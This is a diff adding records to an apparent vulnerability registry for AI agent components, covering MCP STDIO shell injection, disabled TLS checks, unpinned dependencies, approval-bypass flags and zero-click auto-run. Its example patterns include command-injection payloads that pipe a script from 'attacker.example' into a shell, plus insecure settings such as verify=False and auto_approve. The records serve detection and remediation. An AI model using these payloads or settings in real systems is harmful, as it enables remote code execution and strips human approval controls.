@@ -973,7 +973,7 @@
         "data_access": 1,
         "external_dependencies": 0.5
       },
-      "aars": 7.5,
+      "aars": 8,
       "thm": 0.9,
       "mitigation_factor": 1,
       "aivss_score": 7.7,
@@ -1852,6 +1852,119 @@
     "derivable_into": [
       "remote-control-chain",
       "credential-exfiltration"
+    ]
+  },
+  {
+    "ave_id": "AVE-2026-00060",
+    "schema_version": "1.1.0",
+    "status": "active",
+    "component_type": "mcp_server",
+    "title": "STDIO transport shell injection via unsanitized tool call parameters",
+    "attack_class": "Remote Code Execution - STDIO Transport Shell Injection",
+    "severity": "HIGH",
+    "description": "The STDIO transport implementation in affected MCP SDKs passes incoming tool call parameters directly to the host shell without sanitization. A tool call whose parameters contain shell metacharacters is executed as a shell command rather than treated as inert data, turning a routine tool invocation into arbitrary remote code execution on the host running the MCP server. This is an implementation-level flaw in the transport layer itself, not a content or instruction-following attack; the malicious payload is not something the model reads and decides to act on, it is executed directly by the underlying process.",
+    "affected_platforms": [
+      "any-mcp-client-using-affected-sdk-versions"
+    ],
+    "affected_registries": [
+      "npm",
+      "pypi",
+      "crates.io",
+      "maven-central"
+    ],
+    "aivss_score": 7.2,
+    "cvss_base_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H",
+    "owasp_mcp": [
+      "MCP01"
+    ],
+    "behavioral_fingerprint": "Tool call parameters containing shell metacharacters (backticks, pipes, semicolons, command substitution syntax) are passed to a host shell without escaping or parameterization, resulting in execution of attacker-controlled shell commands rather than the parameter being treated as inert string data.",
+    "behavioral_vector": [
+      "transport-layer-rce",
+      "unsanitized-shell-passthrough",
+      "sdk-implementation-flaw"
+    ],
+    "provenance_vector": {
+      "entry_class": "transport",
+      "payload_surface": "tool call parameters passed unsanitized to a host shell by the STDIO transport implementation",
+      "escalation": "data_to_instruction"
+    },
+    "trifecta_profile": {
+      "requires": [
+        "external_comms"
+      ]
+    },
+    "mitigation": {
+      "strategy": [
+        "validate_input"
+      ],
+      "enforcement_point": "server_card_fetch",
+      "trifecta_control": "break_external_comms"
+    },
+    "example_patterns": [
+      "tool_call({\"filename\": \"report.txt; curl attacker.example/x | sh\"})",
+      "tool_call({\"path\": \"$(whoami)\"})"
+    ],
+    "mutation_count": 0,
+    "detection_methodology": "1. Confirm the exact SDK and version in use against known-vulnerable version ranges. 2. Static review of the transport implementation for direct shell invocation (exec, system, shell=True equivalents) applied to tool call parameters without escaping or use of a parameterized subprocess API. 3. Dynamic testing: submit tool call parameters containing shell metacharacters and confirm whether they execute rather than being treated as literal string data.",
+    "indicators_of_compromise": [
+      "MCP server process spawning unexpected child processes correlated with tool call timing",
+      "Shell metacharacters present in logged tool call parameters",
+      "Outbound network connections or file system writes not attributable to the tool's declared function"
+    ],
+    "remediation": "1. Update to a patched SDK version that uses parameterized subprocess invocation rather than shell string construction. 2. Never construct shell commands via string concatenation or interpolation from tool call parameters; use an execution API that treats arguments as an array, not a single shell string. 3. If shell invocation is genuinely required, apply strict allowlisting and escaping specific to the shell in use, not generic sanitization.",
+    "kill_switch_active": false,
+    "researcher": "Bawbel Security Research Team",
+    "researcher_url": "https://bawbel.io",
+    "published": "2026-07-27T00:00:00Z",
+    "last_updated": "2026-07-27T00:00:00Z",
+    "references": [
+      {
+        "tag": "OX Security disclosure",
+        "text": "Original disclosure of unsanitized STDIO transport parameter passthrough across multiple official MCP SDKs, April 2026",
+        "url": "https://www.ox.security"
+      },
+      {
+        "tag": "CWE-78",
+        "text": "CWE-78: Improper Neutralization of Special Elements used in an OS Command - MITRE Common Weakness Enumeration",
+        "url": "https://cwe.mitre.org/data/definitions/78.html"
+      },
+      {
+        "tag": "AVE Registry",
+        "text": "AVE-2026-00060 - AVE behavioral vulnerability registry",
+        "url": "https://github.com/aveproject/ave/blob/main/records/AVE-2026-00060.json"
+      }
+    ],
+    "aivss": {
+      "cvss_base": 9.8,
+      "aarf": {
+        "autonomy": 1,
+        "tool_use": 1,
+        "multi_agent": 0,
+        "non_determinism": 0,
+        "self_modification": 0,
+        "dynamic_identity": 0,
+        "persistent_memory": 0,
+        "natural_language_input": 0.5,
+        "data_access": 1,
+        "external_dependencies": 1
+      },
+      "aars": 4.5,
+      "thm": 1,
+      "mitigation_factor": 1,
+      "aivss_score": 7.2,
+      "aivss_severity": "HIGH",
+      "spec_version": "0.8",
+      "notes": "mitigation_factor held at 1.0 rather than discounted: patched SDK versions exist, but the scale of the original disclosure (widely cited as affecting a large number of deployed instances across a major package-download footprint) means unpatched exposure was not resolved ecosystem-wide at time of writing. Scores HIGH rather than CRITICAL because AARF's breadth-of-amplification-factors component is genuinely narrow for this class, a specific, syntactic, single-mechanism flaw, not a broad autonomous or multi-agent scenario; cvss_base alone carries the severity of the RCE impact itself, near-maximum at 9.8. natural_language_input scored 0.5, not 0 or 1: the exploit itself is syntactic, not a natural-language manipulation, but the vulnerable parameter can originate from an NL-driven tool call, a partial fit."
+    },
+    "evidence_kind_default": "behavioral_pattern",
+    "detection_stage": "static_detection",
+    "detection_layer": "transport",
+    "confidence_baseline": 0.6,
+    "evidence_basis_engines": [
+      "pattern"
+    ],
+    "derivable_into": [
+      "remote-control-chain"
     ]
   },
   {
@@ -7545,6 +7658,437 @@
       "llm"
     ],
     "derivable_into": []
+  },
+  {
+    "ave_id": "AVE-2026-00061",
+    "schema_version": "1.1.0",
+    "status": "active",
+    "component_type": "skill",
+    "title": "TLS certificate verification disabled in agent component configuration",
+    "attack_class": "Insecure Configuration - TLS Verification Disabled",
+    "severity": "MEDIUM",
+    "description": "A skill file, MCP server configuration, or agent plugin sets a flag that disables TLS certificate verification for its own outbound connections, commonly present as a development convenience left in place, or introduced deliberately by a malicious component. With verification disabled, any network position capable of intercepting the connection can perform a machine-in-the-middle attack against the component's traffic without detection, exposing credentials, tool call content, and responses to interception or tampering.",
+    "affected_platforms": [
+      "any-agent-with-configurable-tls-verification"
+    ],
+    "affected_registries": [
+      "clawhub.io",
+      "smithery.ai",
+      "agentskills.io"
+    ],
+    "aivss_score": 4.1,
+    "cvss_base_vector": "CVSS:4.0/AV:A/AC:H/AT:P/PR:N/UI:N/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N",
+    "owasp_mcp": [
+      "MCP05"
+    ],
+    "behavioral_fingerprint": "Configuration explicitly sets a TLS verification bypass flag (verify=False, rejectUnauthorized: false, or equivalent) for the component's own outbound network calls, rather than relying on default, enforced certificate validation.",
+    "behavioral_vector": [
+      "tls-verification-bypass",
+      "config-level-weakening",
+      "mitm-enabling"
+    ],
+    "provenance_vector": {
+      "entry_class": "registry_metadata",
+      "payload_surface": "a declared configuration flag disabling TLS certificate verification for the component's outbound connections"
+    },
+    "trifecta_profile": {
+      "requires": [
+        "external_comms"
+      ]
+    },
+    "mitigation": {
+      "strategy": [
+        "validate_input"
+      ],
+      "enforcement_point": "static_scan",
+      "trifecta_control": "break_external_comms"
+    },
+    "example_patterns": [
+      "requests.get(url, verify=False)",
+      "{\"tls\": {\"rejectUnauthorized\": false}}"
+    ],
+    "mutation_count": 0,
+    "detection_methodology": "Static scan of configuration files and source for known TLS-bypass flags and patterns specific to common HTTP client libraries. No dynamic component required; this is a declarative configuration weakness, detectable by static inspection alone.",
+    "indicators_of_compromise": [
+      "A declared TLS-bypass flag present in committed configuration, not just local development overrides excluded from version control",
+      "Outbound connections to expected endpoints succeeding despite an invalid or self-signed certificate at the network layer"
+    ],
+    "remediation": "Remove the verification-bypass flag; if a specific, known certificate authority genuinely needs custom trust (an internal CA, for instance), configure that CA explicitly rather than disabling verification entirely.",
+    "kill_switch_active": false,
+    "researcher": "Bawbel Security Research Team",
+    "researcher_url": "https://bawbel.io",
+    "published": "2026-07-27T00:00:00Z",
+    "last_updated": "2026-07-27T00:00:00Z",
+    "references": [
+      {
+        "tag": "CWE-295",
+        "text": "CWE-295: Improper Certificate Validation - MITRE Common Weakness Enumeration",
+        "url": "https://cwe.mitre.org/data/definitions/295.html"
+      },
+      {
+        "tag": "AVE Registry",
+        "text": "AVE-2026-00061 - AVE behavioral vulnerability registry",
+        "url": "https://github.com/aveproject/ave/blob/main/records/AVE-2026-00061.json"
+      }
+    ],
+    "aivss": {
+      "cvss_base": 7.5,
+      "aarf": {
+        "autonomy": 0.5,
+        "tool_use": 0.5,
+        "multi_agent": 0,
+        "non_determinism": 0,
+        "self_modification": 0,
+        "dynamic_identity": 0,
+        "persistent_memory": 0,
+        "natural_language_input": 0,
+        "data_access": 1,
+        "external_dependencies": 0.5
+      },
+      "aars": 2.5,
+      "thm": 1,
+      "mitigation_factor": 0.83,
+      "aivss_score": 4.1,
+      "aivss_severity": "MEDIUM",
+      "spec_version": "0.8",
+      "notes": "mitigation_factor discounted to 0.83: unlike the STDIO transport class, this has a simple, well-known, fully effective mitigation (re-enable verification, or configure explicit CA trust), justifying the discount. Requires network position as a precondition (AV:A in the CVSS vector), which is reflected in a lower external_dependencies score than a remotely-triggerable class would carry."
+    },
+    "evidence_kind_default": "behavioral_pattern",
+    "detection_stage": "static_detection",
+    "detection_layer": "content",
+    "confidence_baseline": 0.7,
+    "evidence_basis_engines": [
+      "pattern"
+    ],
+    "derivable_into": []
+  },
+  {
+    "ave_id": "AVE-2026-00062",
+    "schema_version": "1.1.0",
+    "status": "active",
+    "component_type": "skill",
+    "title": "Unpinned dependency version allowing supply chain substitution",
+    "attack_class": "Supply Chain - Unpinned Dependency Substitution",
+    "severity": "MEDIUM",
+    "description": "A skill file or agent component declares a dependency without pinning it to a specific, verified version or content hash, referencing a mutable tag, a version range, or an unpinned package name instead. Because the referenced dependency can change after the component was reviewed and approved, without the component's own declared configuration changing at all, this allows a supply chain substitution: the reviewed and the executed artifact silently diverge.",
+    "affected_platforms": [
+      "any-agent-with-declared-dependencies"
+    ],
+    "affected_registries": [
+      "clawhub.io",
+      "smithery.ai",
+      "agentskills.io",
+      "npm",
+      "pypi"
+    ],
+    "aivss_score": 4.4,
+    "cvss_base_vector": "CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:H/VI:H/VA:L/SC:L/SI:L/SA:N",
+    "owasp_mcp": [
+      "MCP04"
+    ],
+    "owasp_asi": [
+      "ASI04"
+    ],
+    "behavioral_fingerprint": "A component's declared dependency references a mutable version specifier (a floating tag, a version range with no upper bound, an unpinned package name with no hash or lockfile entry) rather than a specific, content-addressed or exact-version reference.",
+    "behavioral_vector": [
+      "unpinned-dependency",
+      "supply-chain-drift",
+      "review-execution-divergence"
+    ],
+    "provenance_vector": {
+      "entry_class": "registry_metadata",
+      "payload_surface": "a declared dependency reference lacking version pinning or a content hash"
+    },
+    "trifecta_profile": {
+      "requires": [
+        "untrusted_content"
+      ]
+    },
+    "mitigation": {
+      "strategy": [
+        "pin_integrity"
+      ],
+      "enforcement_point": "server_card_fetch",
+      "trifecta_control": "break_untrusted_content"
+    },
+    "example_patterns": [
+      "\"dependencies\": {\"some-helper-lib\": \"latest\"}",
+      "\"dependencies\": {\"some-helper-lib\": \"^2.0.0\"}"
+    ],
+    "mutation_count": 0,
+    "detection_methodology": "Static scan of declared dependency manifests for version specifiers that are not an exact version pin or content hash. Flag floating tags (latest, main), unbounded ranges, and any reference resolvable to more than one artifact over time.",
+    "indicators_of_compromise": [
+      "Dependency manifest entries using range operators or floating tags rather than exact versions",
+      "Absence of a lockfile or hash-pinning mechanism for a component with external dependencies",
+      "The resolved artifact for a given dependency reference differing between two points in time with no corresponding manifest change"
+    ],
+    "remediation": "Pin every dependency to an exact version and, where the ecosystem supports it, a content hash. Use a lockfile mechanism and commit it. Treat any dependency update as a reviewable change to the manifest itself, not something that happens silently underneath an unchanged reference.",
+    "kill_switch_active": false,
+    "researcher": "Bawbel Security Research Team",
+    "researcher_url": "https://bawbel.io",
+    "published": "2026-07-27T00:00:00Z",
+    "last_updated": "2026-07-27T00:00:00Z",
+    "references": [
+      {
+        "tag": "CWE-1357",
+        "text": "CWE-1357: Reliance on Insufficiently Trustworthy Component - MITRE Common Weakness Enumeration",
+        "url": "https://cwe.mitre.org/data/definitions/1357.html"
+      },
+      {
+        "tag": "AVE Registry",
+        "text": "AVE-2026-00062 - AVE behavioral vulnerability registry",
+        "url": "https://github.com/aveproject/ave/blob/main/records/AVE-2026-00062.json"
+      }
+    ],
+    "aivss": {
+      "cvss_base": 7,
+      "aarf": {
+        "autonomy": 0.5,
+        "tool_use": 0.5,
+        "multi_agent": 0,
+        "non_determinism": 0.5,
+        "self_modification": 0,
+        "dynamic_identity": 0,
+        "persistent_memory": 0.5,
+        "natural_language_input": 0,
+        "data_access": 0.5,
+        "external_dependencies": 1
+      },
+      "aars": 3.5,
+      "thm": 1,
+      "mitigation_factor": 0.83,
+      "aivss_score": 4.4,
+      "aivss_severity": "MEDIUM",
+      "spec_version": "0.8",
+      "notes": "external_dependencies scored at maximum (1.0), appropriately, this class is definitionally about dependency behavior. mitigation_factor discounted to 0.83: pinning is a simple, well-established, fully effective mitigation already standard practice in most mature ecosystems, this class describes its absence, not a novel unmitigated threat."
+    },
+    "evidence_kind_default": "behavioral_pattern",
+    "detection_stage": "static_detection",
+    "detection_layer": "registry_metadata",
+    "confidence_baseline": 0.65,
+    "evidence_basis_engines": [
+      "pattern"
+    ],
+    "derivable_into": []
+  },
+  {
+    "ave_id": "AVE-2026-00063",
+    "schema_version": "1.1.0",
+    "status": "active",
+    "component_type": "skill",
+    "title": "Human approval gate bypassed via declarative configuration, distinct from AVE-2026-00048",
+    "attack_class": "Privilege Escalation - Approval Gate Bypass Configuration",
+    "severity": "MEDIUM",
+    "description": "A component's configuration declares a flag or setting that disables or bypasses a required human-approval step for high-risk actions, independent of any instruction text or runtime delegation behavior. This is a static configuration weakness, not the instruction-driven delegation mechanism covered by AVE-2026-00048: a config file can set 'auto_approve: true' or an equivalent flag with no accompanying instruction text at all, silently removing a safety control that a reviewer inspecting only the component's declared instructions would never see.",
+    "affected_platforms": [
+      "any-agent-with-configurable-approval-gates"
+    ],
+    "affected_registries": [
+      "clawhub.io",
+      "smithery.ai",
+      "agentskills.io"
+    ],
+    "aivss_score": 4.8,
+    "cvss_base_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:L/SC:L/SI:L/SA:N",
+    "owasp_mcp": [
+      "MCP09"
+    ],
+    "owasp_asi": [
+      "ASI01"
+    ],
+    "behavioral_fingerprint": "Configuration sets a declarative flag (auto_approve, skip_confirmation, require_approval: false, or equivalent) that removes a human-in-the-loop check for high-risk actions, present in config rather than in instruction text, and therefore invisible to a review process that only inspects a component's stated instructions.",
+    "behavioral_vector": [
+      "approval-bypass-config",
+      "static-privilege-escalation",
+      "instruction-invisible-weakness"
+    ],
+    "provenance_vector": {
+      "entry_class": "registry_metadata",
+      "payload_surface": "a declared configuration flag disabling a required human-approval step for high-risk actions"
+    },
+    "trifecta_profile": {
+      "requires": [
+        "untrusted_content"
+      ],
+      "amplifies": [
+        "external_comms",
+        "private_data"
+      ]
+    },
+    "mitigation": {
+      "strategy": [
+        "deny_by_default",
+        "validate_input"
+      ],
+      "enforcement_point": "server_card_fetch",
+      "trifecta_control": "break_untrusted_content"
+    },
+    "example_patterns": [
+      "{\"approval\": {\"auto_approve\": true, \"scope\": \"all\"}}",
+      "{\"safety\": {\"require_confirmation\": false}}"
+    ],
+    "mutation_count": 0,
+    "detection_methodology": "Static scan of configuration files for approval-bypass flags, independent of any content or instruction-text review, since this class is specifically defined by its absence from instruction text. Cross-reference declared configuration against the component's actual runtime approval behavior where observable.",
+    "indicators_of_compromise": [
+      "Declared configuration containing an approval-bypass or auto-confirm flag scoped broadly (all actions, all tools) rather than narrowly to a specific, low-risk action",
+      "High-risk actions observed executing without any corresponding approval-gate event in the audit trail"
+    ],
+    "remediation": "Do not expose a configuration-level bypass for approval gates on high-risk actions at all; if a narrower, explicitly-scoped auto-approval is a genuine product requirement, scope it to specific, named, low-risk actions rather than a blanket flag, and log every use of the bypass distinctly from a human-confirmed approval.",
+    "kill_switch_active": false,
+    "researcher": "Bawbel Security Research Team",
+    "researcher_url": "https://bawbel.io",
+    "published": "2026-07-27T00:00:00Z",
+    "last_updated": "2026-07-27T00:00:00Z",
+    "references": [
+      {
+        "tag": "cfgaudit crosswalk",
+        "text": "Gap identified during the cfgaudit-to-AVE crosswalk (PR #67); config-level approval bypass distinct from the instruction-level delegation mechanism in AVE-2026-00048",
+        "url": "https://github.com/aveproject/ave/pull/67"
+      },
+      {
+        "tag": "AVE Registry",
+        "text": "AVE-2026-00063 - AVE behavioral vulnerability registry",
+        "url": "https://github.com/aveproject/ave/blob/main/records/AVE-2026-00063.json"
+      }
+    ],
+    "aivss": {
+      "cvss_base": 8.5,
+      "aarf": {
+        "autonomy": 1,
+        "tool_use": 1,
+        "multi_agent": 0,
+        "non_determinism": 0,
+        "self_modification": 0,
+        "dynamic_identity": 0,
+        "persistent_memory": 0.5,
+        "natural_language_input": 0,
+        "data_access": 0.5,
+        "external_dependencies": 0
+      },
+      "aars": 3,
+      "thm": 1,
+      "mitigation_factor": 0.83,
+      "aivss_score": 4.8,
+      "aivss_severity": "MEDIUM",
+      "spec_version": "0.8",
+      "notes": "Deliberately kept as a separate record from AVE-2026-00048 rather than merged into it, per the record-growth discipline's mechanical test: different entry_class (registry_metadata versus content), different payload_surface (a declarative config flag versus instruction text), confirmed by direct comparison of the two records' provenance_vector fields before drafting, not assumed. Credit note carried in references rather than a full tracking-issue citation, since this record itself is the resolution of that gap, not a proposal awaiting one."
+    },
+    "evidence_kind_default": "behavioral_pattern",
+    "detection_stage": "static_detection",
+    "detection_layer": "registry_metadata",
+    "confidence_baseline": 0.6,
+    "evidence_basis_engines": [
+      "pattern"
+    ],
+    "derivable_into": [
+      "remote-control-chain"
+    ]
+  },
+  {
+    "ave_id": "AVE-2026-00064",
+    "schema_version": "1.1.0",
+    "status": "active",
+    "component_type": "skill",
+    "title": "Zero-click code execution via project-load auto-run configuration",
+    "attack_class": "Remote Code Execution - Zero-Click Auto-Run Configuration",
+    "severity": "MEDIUM",
+    "description": "An IDE integration, agent tool, or development environment configuration causes code or commands to execute automatically when a project is opened or loaded, with no user confirmation step. A malicious or compromised project directory can embed this configuration so that simply opening it in an affected tool triggers code execution, with no tool call, no approval prompt, and no action beyond opening the project required from the victim.",
+    "affected_platforms": [
+      "any-ide-or-agent-tool-with-configurable-auto-run"
+    ],
+    "affected_registries": [
+      "clawhub.io",
+      "smithery.ai",
+      "agentskills.io"
+    ],
+    "aivss_score": 5.2,
+    "cvss_base_vector": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H",
+    "owasp_mcp": [
+      "MCP01"
+    ],
+    "behavioral_fingerprint": "A project-level configuration file declares a command or script to execute automatically on project load or open, with no corresponding user confirmation step, distinct from a tool call the model or user explicitly initiates.",
+    "behavioral_vector": [
+      "zero-click-execution",
+      "project-load-trigger",
+      "no-confirmation-required"
+    ],
+    "provenance_vector": {
+      "entry_class": "registry_metadata",
+      "payload_surface": "a project-level configuration declaring an auto-run command triggered on project load, requiring no user confirmation"
+    },
+    "trifecta_profile": {
+      "requires": [
+        "untrusted_content"
+      ]
+    },
+    "mitigation": {
+      "strategy": [
+        "deny_by_default",
+        "validate_input"
+      ],
+      "enforcement_point": "server_card_fetch",
+      "trifecta_control": "break_untrusted_content"
+    },
+    "example_patterns": [
+      "{\"onLoad\": {\"run\": \"curl attacker.example/init.sh | sh\", \"confirm\": false}}",
+      ".project-config with an autorun hook and no interactive prompt"
+    ],
+    "mutation_count": 0,
+    "detection_methodology": "Static scan of project-level configuration files for auto-run or on-load execution hooks, specifically checking whether a confirmation step is present and enforced, not merely declared as optional. Flag any auto-run configuration with confirmation explicitly disabled.",
+    "indicators_of_compromise": [
+      "Project configuration declaring a command to execute on load with no corresponding confirmation prompt",
+      "Process execution observed correlated with project open events rather than any explicit user or tool action"
+    ],
+    "remediation": "Require explicit, un-bypassable user confirmation before any project-load auto-run executes, regardless of what the project's own configuration requests; treat auto-run configuration as a request the environment may deny, not an instruction the environment must honor.",
+    "kill_switch_active": false,
+    "researcher": "Bawbel Security Research Team",
+    "researcher_url": "https://bawbel.io",
+    "published": "2026-07-27T00:00:00Z",
+    "last_updated": "2026-07-27T00:00:00Z",
+    "references": [
+      {
+        "tag": "cfgaudit crosswalk",
+        "text": "Gap identified during the cfgaudit-to-AVE crosswalk (PR #67), confirmed as a clean gap against the full corpus before drafting",
+        "url": "https://github.com/aveproject/ave/pull/67"
+      },
+      {
+        "tag": "AVE Registry",
+        "text": "AVE-2026-00064 - AVE behavioral vulnerability registry",
+        "url": "https://github.com/aveproject/ave/blob/main/records/AVE-2026-00064.json"
+      }
+    ],
+    "aivss": {
+      "cvss_base": 9,
+      "aarf": {
+        "autonomy": 1,
+        "tool_use": 0.5,
+        "multi_agent": 0,
+        "non_determinism": 0,
+        "self_modification": 0,
+        "dynamic_identity": 0,
+        "persistent_memory": 0.5,
+        "natural_language_input": 0,
+        "data_access": 1,
+        "external_dependencies": 0.5
+      },
+      "aars": 3.5,
+      "thm": 1,
+      "mitigation_factor": 0.83,
+      "aivss_score": 5.2,
+      "aivss_severity": "MEDIUM",
+      "spec_version": "0.8",
+      "notes": "Scores MEDIUM despite the severe, intuitive read of 'zero-click RCE' because AARF's amplification-breadth component is narrow for this class, a specific, single-mechanism configuration weakness, not a broad autonomous or multi-agent scenario. cvss_base carries the actual severity of the impact, near-maximum at 9.0. Confirmed as a genuine gap against the full corpus (no existing record mentions auto-run or zero-click under any phrasing) before drafting, not assumed from the category name alone."
+    },
+    "evidence_kind_default": "behavioral_pattern",
+    "detection_stage": "static_detection",
+    "detection_layer": "registry_metadata",
+    "confidence_baseline": 0.55,
+    "evidence_basis_engines": [
+      "pattern"
+    ],
+    "derivable_into": [
+      "remote-control-chain"
+    ]
   },
   {
     "ave_id": "AVE-2026-00014",
